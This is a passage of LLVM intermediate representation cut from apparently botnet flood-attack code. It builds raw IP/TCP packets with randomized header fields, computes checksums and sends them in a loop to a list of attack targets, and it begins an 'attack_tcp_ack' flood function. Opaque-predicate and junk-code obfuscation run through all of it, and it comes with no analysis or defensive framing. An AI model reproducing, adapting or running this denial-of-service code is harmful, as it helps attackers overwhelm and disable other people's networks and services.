  %539 = load i32, i32* @x.23
  %540 = load i32, i32* @y.24
  %541 = sub i32 %539, 1
  %542 = mul i32 %539, %541
  %543 = urem i32 %542, 2
  %544 = icmp eq i32 %543, 0
  %545 = icmp slt i32 %540, 10
  %546 = or i1 %544, %545
  br i1 %546, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %547

; <label>:547:                                    ; preds = %originalBBpart252, %524
  %548 = load i32, i32* @x.23
  %549 = load i32, i32* @y.24
  %550 = sub i32 %548, 1
  %551 = mul i32 %548, %550
  %552 = urem i32 %551, 2
  %553 = icmp eq i32 %552, 0
  %554 = icmp slt i32 %549, 10
  %555 = or i1 %553, %554
  br i1 %555, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %547
  %556 = load i32, i32* %29, align 4
  %557 = icmp eq i32 %556, 65535
  %558 = load i32, i32* @x.23
  %559 = load i32, i32* @y.24
  %560 = sub i32 %558, 1
  %561 = mul i32 %558, %560
  %562 = urem i32 %561, 2
  %563 = icmp eq i32 %562, 0
  %564 = icmp slt i32 %559, 10
  %565 = or i1 %563, %564
  br i1 %565, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %557, label %566, label %570

; <label>:566:                                    ; preds = %originalBBpart256
  %567 = call i32 @rand_next()
  %568 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %569 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %568, i32 0, i32 3
  store i32 %567, i32* %569, align 4
  br label %570

; <label>:570:                                    ; preds = %566, %originalBBpart256
  %571 = load i8, i8* %30, align 1
  %572 = icmp ne i8 %571, 0
  br i1 %572, label %573, label %579

; <label>:573:                                    ; preds = %570
  %574 = call i32 @rand_next()
  %575 = and i32 %574, 65535
  %576 = trunc i32 %575 to i16
  %577 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %578 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %577, i32 0, i32 7
  store i16 %576, i16* %578, align 2
  br label %579

; <label>:579:                                    ; preds = %573, %570
  %580 = load i32, i32* @x.23
  %581 = load i32, i32* @y.24
  %582 = sub i32 %580, 1
  %583 = mul i32 %580, %582
  %584 = urem i32 %583, 2
  %585 = icmp eq i32 %584, 0
  %586 = icmp slt i32 %581, 10
  %587 = or i1 %585, %586
  br i1 %587, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %579
  %588 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %589 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %588, i32 0, i32 7
  store i16 0, i16* %589, align 2
  %590 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %591 = bitcast %struct.iphdr* %590 to i16*
  %592 = call zeroext i16 @checksum_generic(i16* %591, i32 20)
  %593 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %594 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %593, i32 0, i32 7
  store i16 %592, i16* %594, align 2
  %595 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %596 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %595, i32 0, i32 6
  store i16 0, i16* %596, align 4
  %597 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %598 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %599 = bitcast %struct.tcphdr* %598 to i8*
  %600 = call zeroext i16 @htons(i16 zeroext 40) #7
  %601 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %597, i8* %599, i16 zeroext %600, i32 40)
  %602 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %603 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %602, i32 0, i32 6
  store i16 %601, i16* %603, align 4
  %604 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %605 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %604, i32 0, i32 1
  %606 = load i16, i16* %605, align 2
  %607 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %608 = load i32, i32* %19, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %607, i64 %609
  %611 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %610, i32 0, i32 0
  %612 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %611, i32 0, i32 1
  store i16 %606, i16* %612, align 2
  %613 = load i32, i32* %20, align 4
  %614 = load i8*, i8** %41, align 8
  %615 = bitcast %union.__CONST_SOCKADDR_ARG* %44 to %struct.sockaddr**
  %616 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %617 = load i32, i32* %19, align 4
  %618 = sext i32 %617 to i64
  %619 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %616, i64 %618
  %620 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %619, i32 0, i32 0
  %621 = bitcast %struct.sockaddr_in* %620 to %struct.sockaddr*
  store %struct.sockaddr* %621, %struct.sockaddr** %615, align 8
  %622 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %44, i32 0, i32 0
  %623 = load %struct.sockaddr*, %struct.sockaddr** %622, align 8
  %624 = call i64 @sendto(i32 %613, i8* %614, i64 60, i32 16384, %struct.sockaddr* %623, i32 16)
  %625 = load i32, i32* @x.23
  %626 = load i32, i32* @y.24
  %627 = sub i32 %625, 1
  %628 = mul i32 %625, %627
  %629 = urem i32 %628, 2
  %630 = icmp eq i32 %629, 0
  %631 = icmp slt i32 %626, 10
  %632 = or i1 %630, %631
  br i1 %632, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %633

; <label>:633:                                    ; preds = %originalBBpart260
  %634 = load i32, i32* @x.23
  %635 = load i32, i32* @y.24
  %636 = sub i32 %634, 1
  %637 = mul i32 %634, %636
  %638 = urem i32 %637, 2
  %639 = icmp eq i32 %638, 0
  %640 = icmp slt i32 %635, 10
  %641 = or i1 %639, %640
  br i1 %641, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %633
  %642 = load i32, i32* %19, align 4
  %643 = add nsw i32 %642, 1
  store i32 %643, i32* %19, align 4
  %644 = load i32, i32* @x.23
  %645 = load i32, i32* @y.24
  %646 = sub i32 %644, 1
  %647 = mul i32 %644, %646
  %648 = urem i32 %647, 2
  %649 = icmp eq i32 %648, 0
  %650 = icmp slt i32 %645, 10
  %651 = or i1 %649, %650
  br i1 %651, label %originalBBpart277, label %originalBB62alteredBB

originalBBpart277:                                ; preds = %originalBB62
  br label %362

; <label>:652:                                    ; preds = %362
  %653 = load i32, i32* @x.23
  %654 = load i32, i32* @y.24
  %655 = sub i32 %653, 1
  %656 = mul i32 %653, %655
  %657 = urem i32 %656, 2
  %658 = icmp eq i32 %657, 0
  %659 = icmp slt i32 %654, 10
  %660 = or i1 %658, %659
  br i1 %660, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %652
  %661 = call i64 @time(i64* null) #6
  %662 = load i32, i32* %37, align 4
  %663 = sext i32 %662 to i64
  %664 = icmp sgt i64 %661, %663
  %665 = load i32, i32* @x.23
  %666 = load i32, i32* @y.24
  %667 = sub i32 %665, 1
  %668 = mul i32 %665, %667
  %669 = urem i32 %668, 2
  %670 = icmp eq i32 %669, 0
  %671 = icmp slt i32 %666, 10
  %672 = or i1 %670, %671
  br i1 %672, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br i1 %664, label %673, label %674

; <label>:673:                                    ; preds = %originalBBpart281
  br label %675

; <label>:674:                                    ; preds = %originalBBpart281
  br label %361

; <label>:675:                                    ; preds = %673, %originalBBpart29, %122
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %676 = alloca i32, align 4
  %677 = alloca i8, align 1
  %678 = alloca %struct.attack_target*, align 8
  %679 = alloca i8, align 1
  %680 = alloca %struct.attack_option*, align 8
  %681 = alloca i32, align 4
  %682 = alloca i32, align 4
  %683 = alloca i8**, align 8
  %684 = alloca i8, align 1
  %685 = alloca i16, align 2
  %686 = alloca i8, align 1
  %687 = alloca i8, align 1
  %688 = alloca i16, align 2
  %689 = alloca i16, align 2
  %690 = alloca i32, align 4
  %691 = alloca i32, align 4
  %692 = alloca i8, align 1
  %693 = alloca i8, align 1
  %694 = alloca i8, align 1
  %695 = alloca i8, align 1
  %696 = alloca i8, align 1
  %697 = alloca i8, align 1
  %698 = alloca i32, align 4
  %699 = alloca i32, align 4
  %700 = alloca %struct.iphdr*, align 8
  %701 = alloca %struct.tcphdr*, align 8
  %702 = alloca i8*, align 8
  %703 = alloca i8*, align 8
  %704 = alloca %struct.iphdr*, align 8
  %705 = alloca %struct.tcphdr*, align 8
  %706 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %676, align 4
  store i8 %1, i8* %677, align 1
  store %struct.attack_target* %2, %struct.attack_target** %678, align 8
  store i8 %3, i8* %679, align 1
  store %struct.attack_option* %4, %struct.attack_option** %680, align 8
  store i32 0, i32* %681, align 4
  store i32 0, i32* %682, align 4
  %707 = load i8, i8* %677, align 1
  %708 = zext i8 %707 to i64
  %709 = call noalias i8* @calloc(i64 %708, i64 8) #6
  %710 = bitcast i8* %709 to i8**
  store i8** %710, i8*** %683, align 8
  %711 = load i8, i8* %679, align 1
  %712 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %713 = call i32 @attack_get_opt_int(i8 zeroext %711, %struct.attack_option* %712, i8 zeroext 2, i32 0)
  %714 = trunc i32 %713 to i8
  store i8 %714, i8* %684, align 1
  %715 = load i8, i8* %679, align 1
  %716 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %717 = call i32 @attack_get_opt_int(i8 zeroext %715, %struct.attack_option* %716, i8 zeroext 3, i32 65535)
  %718 = trunc i32 %717 to i16
  store i16 %718, i16* %685, align 2
  %719 = load i8, i8* %679, align 1
  %720 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %721 = call i32 @attack_get_opt_int(i8 zeroext %719, %struct.attack_option* %720, i8 zeroext 4, i32 64)
  %722 = trunc i32 %721 to i8
  store i8 %722, i8* %686, align 1
  %723 = load i8, i8* %679, align 1
  %724 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %725 = call i32 @attack_get_opt_int(i8 zeroext %723, %struct.attack_option* %724, i8 zeroext 5, i32 1)
  %726 = trunc i32 %725 to i8
  store i8 %726, i8* %687, align 1
  %727 = load i8, i8* %679, align 1
  %728 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %729 = call i32 @attack_get_opt_int(i8 zeroext %727, %struct.attack_option* %728, i8 zeroext 6, i32 65535)
  %730 = trunc i32 %729 to i16
  store i16 %730, i16* %688, align 2
  %731 = load i8, i8* %679, align 1
  %732 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %733 = call i32 @attack_get_opt_int(i8 zeroext %731, %struct.attack_option* %732, i8 zeroext 7, i32 65535)
  %734 = trunc i32 %733 to i16
  store i16 %734, i16* %689, align 2
  %735 = load i8, i8* %679, align 1
  %736 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %737 = call i32 @attack_get_opt_int(i8 zeroext %735, %struct.attack_option* %736, i8 zeroext 16, i32 65535)
  store i32 %737, i32* %690, align 4
  %738 = load i8, i8* %679, align 1
  %739 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %740 = call i32 @attack_get_opt_int(i8 zeroext %738, %struct.attack_option* %739, i8 zeroext 17, i32 0)
  store i32 %740, i32* %691, align 4
  %741 = load i8, i8* %679, align 1
  %742 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %743 = call i32 @attack_get_opt_int(i8 zeroext %741, %struct.attack_option* %742, i8 zeroext 10, i32 0)
  %744 = trunc i32 %743 to i8
  store i8 %744, i8* %692, align 1
  %745 = load i8, i8* %679, align 1
  %746 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %747 = call i32 @attack_get_opt_int(i8 zeroext %745, %struct.attack_option* %746, i8 zeroext 11, i32 0)
  %748 = trunc i32 %747 to i8
  store i8 %748, i8* %693, align 1
  %749 = load i8, i8* %679, align 1
  %750 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %751 = call i32 @attack_get_opt_int(i8 zeroext %749, %struct.attack_option* %750, i8 zeroext 12, i32 0)
  %752 = trunc i32 %751 to i8
  store i8 %752, i8* %694, align 1
  %753 = load i8, i8* %679, align 1
  %754 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %755 = call i32 @attack_get_opt_int(i8 zeroext %753, %struct.attack_option* %754, i8 zeroext 13, i32 0)
  %756 = trunc i32 %755 to i8
  store i8 %756, i8* %695, align 1
  %757 = load i8, i8* %679, align 1
  %758 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %759 = call i32 @attack_get_opt_int(i8 zeroext %757, %struct.attack_option* %758, i8 zeroext 14, i32 1)
  %760 = trunc i32 %759 to i8
  store i8 %760, i8* %696, align 1
  %761 = load i8, i8* %679, align 1
  %762 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %763 = call i32 @attack_get_opt_int(i8 zeroext %761, %struct.attack_option* %762, i8 zeroext 15, i32 0)
  %764 = trunc i32 %763 to i8
  store i8 %764, i8* %697, align 1
  %765 = load i8, i8* %679, align 1
  %766 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %767 = load i32, i32* @LOCAL_ADDR, align 4
  %768 = call i32 @attack_get_opt_ip(i8 zeroext %765, %struct.attack_option* %766, i8 zeroext 24, i32 %767)
  store i32 %768, i32* %698, align 4
  %769 = call i64 @time(i64* null) #6
  %770 = load i32, i32* %676, align 4
  %771 = sext i32 %770 to i64
  %_ = sub i64 %769, %771
  %gen = mul i64 %_, %771
  %_1 = shl i64 %769, %771
  %_2 = shl i64 %769, %771
  %772 = add nsw i64 %769, %771
  %773 = trunc i64 %772 to i32
  store i32 %773, i32* %699, align 4
  %774 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %774, i32* %682, align 4
  %775 = icmp eq i32 %774, -1
  br label %originalBB

originalBB3alteredBB:                             ; preds = %originalBB3, %123
  store i32 1, i32* %19, align 4
  %776 = load i32, i32* %20, align 4
  %777 = bitcast i32* %19 to i8*
  %778 = call i32 @setsockopt(i32 %776, i32 0, i32 3, i8* %777, i32 4) #6
  %779 = icmp eq i32 %778, -1
  br label %originalBB3

originalBB7alteredBB:                             ; preds = %originalBB7, %144
  %780 = load i32, i32* %20, align 4
  %781 = call i32 @close(i32 %780)
  br label %originalBB7

originalBB11alteredBB:                            ; preds = %originalBB11, %164
  %782 = load i32, i32* %19, align 4
  %783 = load i8, i8* %15, align 1
  %784 = zext i8 %783 to i32
  %785 = icmp slt i32 %782, %784
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %367
  %786 = load i8**, i8*** %21, align 8
  %787 = load i32, i32* %19, align 4
  %788 = sext i32 %787 to i64
  %789 = getelementptr inbounds i8*, i8** %786, i64 %788
  %790 = load i8*, i8** %789, align 8
  store i8* %790, i8** %41, align 8
  %791 = load i8*, i8** %41, align 8
  %792 = bitcast i8* %791 to %struct.iphdr*
  store %struct.iphdr* %792, %struct.iphdr** %42, align 8
  %793 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %794 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %793, i64 1
  %795 = bitcast %struct.iphdr* %794 to %struct.tcphdr*
  store %struct.tcphdr* %795, %struct.tcphdr** %43, align 8
  %796 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %797 = load i32, i32* %19, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %796, i64 %798
  %800 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %799, i32 0, i32 2
  %801 = load i8, i8* %800, align 4
  %802 = zext i8 %801 to i32
  %803 = icmp slt i32 %802, 32
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %426
  %804 = call i32 @rand_next()
  %805 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %806 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %805, i32 0, i32 8
  store i32 %804, i32* %806, align 4
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %446
  %807 = load i16, i16* %23, align 2
  %808 = zext i16 %807 to i32
  %809 = icmp eq i32 %808, 65535
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %472
  %810 = load i16, i16* %26, align 2
  %811 = zext i16 %810 to i32
  %812 = icmp eq i32 %811, 65535
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %492
  %813 = call i32 @rand_next()
  %_32 = shl i32 %813, 65535
  %_33 = shl i32 %813, 65535
  %_34 = shl i32 %813, 65535
  %_35 = sub i32 %813, 65535
  %gen36 = mul i32 %_35, 65535
  %_37 = sub i32 0, %813
  %gen38 = add i32 %_37, 65535
  %_39 = sub i32 0, %813
  %gen40 = add i32 %_39, 65535
  %_41 = sub i32 %813, 65535
  %gen42 = mul i32 %_41, 65535
  %_43 = sub i32 %813, 65535
  %gen44 = mul i32 %_43, 65535
  %_45 = sub i32 %813, 65535
  %gen46 = mul i32 %_45, 65535
  %814 = and i32 %813, 65535
  %815 = trunc i32 %814 to i16
  %816 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %817 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %816, i32 0, i32 0
  store i16 %815, i16* %817, align 4
  br label %originalBB31

originalBB50alteredBB:                            ; preds = %originalBB50, %527
  %818 = call i32 @rand_next()
  %819 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %820 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %819, i32 0, i32 2
  store i32 %818, i32* %820, align 4
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %547
  %821 = load i32, i32* %29, align 4
  %822 = icmp eq i32 %821, 65535
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %579
  %823 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %824 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %823, i32 0, i32 7
  store i16 0, i16* %824, align 2
  %825 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %826 = bitcast %struct.iphdr* %825 to i16*
  %827 = call zeroext i16 @checksum_generic(i16* %826, i32 20)
  %828 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %829 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %828, i32 0, i32 7
  store i16 %827, i16* %829, align 2
  %830 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %831 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %830, i32 0, i32 6
  store i16 0, i16* %831, align 4
  %832 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %833 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %834 = bitcast %struct.tcphdr* %833 to i8*
  %835 = call zeroext i16 @htons(i16 zeroext 40) #7
  %836 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %832, i8* %834, i16 zeroext %835, i32 40)
  %837 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %838 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %837, i32 0, i32 6
  store i16 %836, i16* %838, align 4
  %839 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %840 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %839, i32 0, i32 1
  %841 = load i16, i16* %840, align 2
  %842 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %843 = load i32, i32* %19, align 4
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %842, i64 %844
  %846 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %845, i32 0, i32 0
  %847 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %846, i32 0, i32 1
  store i16 %841, i16* %847, align 2
  %848 = load i32, i32* %20, align 4
  %849 = load i8*, i8** %41, align 8
  %850 = bitcast %union.__CONST_SOCKADDR_ARG* %44 to %struct.sockaddr**
  %851 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %852 = load i32, i32* %19, align 4
  %853 = sext i32 %852 to i64
  %854 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %851, i64 %853
  %855 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %854, i32 0, i32 0
  %856 = bitcast %struct.sockaddr_in* %855 to %struct.sockaddr*
  store %struct.sockaddr* %856, %struct.sockaddr** %850, align 8
  %857 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %44, i32 0, i32 0
  %858 = load %struct.sockaddr*, %struct.sockaddr** %857, align 8
  %859 = call i64 @sendto(i32 %848, i8* %849, i64 60, i32 16384, %struct.sockaddr* %858, i32 16)
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %633
  %860 = load i32, i32* %19, align 4
  %_63 = sub i32 0, %860
  %gen64 = add i32 %_63, 1
  %_65 = sub i32 0, %860
  %gen66 = add i32 %_65, 1
  %_67 = sub i32 %860, 1
  %gen68 = mul i32 %_67, 1
  %_69 = shl i32 %860, 1
  %_70 = sub i32 0, %860
  %gen71 = add i32 %_70, 1
  %_72 = sub i32 0, %860
  %gen73 = add i32 %_72, 1
  %_74 = sub i32 0, %860
  %gen75 = add i32 %_74, 1
  %861 = add nsw i32 %860, 1
  store i32 %861, i32* %19, align 4
  br label %originalBB62

originalBB79alteredBB:                            ; preds = %originalBB79, %652
  %862 = call i64 @time(i64* null) #6
  %863 = load i32, i32* %37, align 4
  %864 = sext i32 %863 to i64
  %865 = icmp sgt i64 %862, %864
  br label %originalBB79
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i8, align 1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.tcphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %40 = load i8, i8* %7, align 1
  %41 = zext i8 %40 to i64
  %42 = call noalias i8* @calloc(i64 %41, i64 8) #6
  %43 = bitcast i8* %42 to i8**
  store i8** %43, i8*** %13, align 8
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 2, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %14, align 1
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 3, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %15, align 2
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 4, i32 64)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %16, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 5, i32 0)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %17, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 6, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %18, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 7, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %19, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 16, i32 65535)
  store i32 %70, i32* %20, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 17, i32 65535)
  store i32 %73, i32* %21, align 4
  %74 = load i8, i8* %9, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %76 = call i32 @attack_get_opt_int(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 10, i32 0)
  %77 = trunc i32 %76 to i8
  store i8 %77, i8* %22, align 1
  %78 = load i8, i8* %9, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %80 = call i32 @attack_get_opt_int(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 11, i32 1)
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %23, align 1
  %82 = load i8, i8* %9, align 1
  %83 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %84 = call i32 @attack_get_opt_int(i8 zeroext %82, %struct.attack_option* %83, i8 zeroext 12, i32 0)
  %85 = trunc i32 %84 to i8
  store i8 %85, i8* %24, align 1
  %86 = load i8, i8* %9, align 1
  %87 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %88 = call i32 @attack_get_opt_int(i8 zeroext %86, %struct.attack_option* %87, i8 zeroext 13, i32 0)
  %89 = trunc i32 %88 to i8
  store i8 %89, i8* %25, align 1
  %90 = load i8, i8* %9, align 1
  %91 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %92 = call i32 @attack_get_opt_int(i8 zeroext %90, %struct.attack_option* %91, i8 zeroext 14, i32 0)
  %93 = trunc i32 %92 to i8
  store i8 %93, i8* %26, align 1
  %94 = load i8, i8* %9, align 1
  %95 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %96 = call i32 @attack_get_opt_int(i8 zeroext %94, %struct.attack_option* %95, i8 zeroext 15, i32 0)
  %97 = trunc i32 %96 to i8
  store i8 %97, i8* %27, align 1
  %98 = load i8, i8* %9, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 0, i32 512)
  store i32 %100, i32* %28, align 4
  %101 = load i8, i8* %9, align 1
  %102 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %103 = call i32 @attack_get_opt_int(i8 zeroext %101, %struct.attack_option* %102, i8 zeroext 1, i32 1)
  %104 = trunc i32 %103 to i8
  store i8 %104, i8* %29, align 1
  %105 = load i8, i8* %9, align 1
  %106 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %107 = load i32, i32* @LOCAL_ADDR, align 4
  %108 = call i32 @attack_get_opt_ip(i8 zeroext %105, %struct.attack_option* %106, i8 zeroext 24, i32 %107)
  store i32 %108, i32* %30, align 4
  %109 = call i64 @time(i64* null) #6
  %110 = load i32, i32* %6, align 4
  %111 = sext i32 %110 to i64
  %112 = add nsw i64 %109, %111
  %113 = trunc i64 %112 to i32
  store i32 %113, i32* %31, align 4
  %114 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %114, i32* %12, align 4
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %117

; <label>:116:                                    ; preds = %5
  br label %638

; <label>:117:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %118 = load i32, i32* %12, align 4
  %119 = bitcast i32* %11 to i8*
  %120 = call i32 @setsockopt(i32 %118, i32 0, i32 3, i8* %119, i32 4) #6
  %121 = icmp eq i32 %120, -1
  br i1 %121, label %122, label %125

; <label>:122:                                    ; preds = %117
  %123 = load i32, i32* %12, align 4
  %124 = call i32 @close(i32 %123)
  br label %638

; <label>:125:                                    ; preds = %117
  %126 = load i32, i32* @x.25
  %127 = load i32, i32* @y.26
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB, label %originalBBalteredBB
